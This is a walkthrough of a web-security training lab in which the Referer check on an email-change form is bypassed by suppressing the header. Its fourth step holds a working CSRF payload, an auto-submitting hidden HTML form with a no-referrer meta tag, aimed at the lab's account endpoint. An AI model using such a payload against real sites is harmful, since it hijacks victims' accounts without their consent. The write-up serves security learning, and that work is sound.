# CSRF where Referer validation depends on header being present
* This lab's email change functionatlity is vulnerable to CSRF. It attempts to block cross domain requests but has an insecure fallback.
	* To solve this lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.
	* You can log in to your own account using the following credentials: `wiener:peter`

### 1. Test the email update functionatlity
* Use Burp Proxy to enumerate the request and send to repater for modification.

![26](https://user-images.githubusercontent.com/53956303/153689157-b38787fc-90ff-482c-8f69-6d8574980964.png)
### 2. Try to modify the doamin in the Referer HTTP header
![27](https://user-images.githubusercontent.com/53956303/153689309-14854e4a-02d6-401b-9ec7-ad3887f201b3.png)
* It returns 400 status code and an error message "Invalid referer header"
### 3. Try to delete the entire Referer HTTP header
![28](https://user-images.githubusercontent.com/53956303/153689400-13bbbc59-a754-47b6-825a-883d51df9a32.png)
* it returns 302 status code. It works!

### 4. Make a malicious HTML on the provided Exploit server
```html
<form method="POST" action="https://acfc1f751edccd0bc03925ac00f30050.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="refererpresent@pwned.com">
	<meta name="referrer" content="no-referrer">
</form>
<script>
        document.forms[0].submit();
</script>
```
![29](https://user-images.githubusercontent.com/53956303/153690016-c1764c3b-a406-4356-bcf6-6a16c12ad7e7.png)
* Store the exploit and deliver the exploit to victim.
	* As a result, the lab is solved.

![30](https://user-images.githubusercontent.com/53956303/153690041-45ee4a6c-d00d-491a-ba12-6697bd962353.png)
